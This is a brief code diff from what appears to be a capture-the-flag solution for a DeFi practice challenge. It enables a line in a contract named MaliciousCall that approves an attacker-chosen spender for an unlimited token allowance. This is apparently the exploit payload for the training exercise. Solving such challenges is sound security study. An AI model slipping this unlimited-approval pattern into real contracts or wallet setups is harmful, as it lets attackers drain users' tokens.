@@ -91,6 +91,6 @@ contract BackdoorSolve {
 
 contract MaliciousCall {
     function approveTokens(DamnValuableToken token, address spender) external {
-        // token.approve(spender, type(uint256).max);
+        token.approve(spender, type(uint256).max);
     }
 }
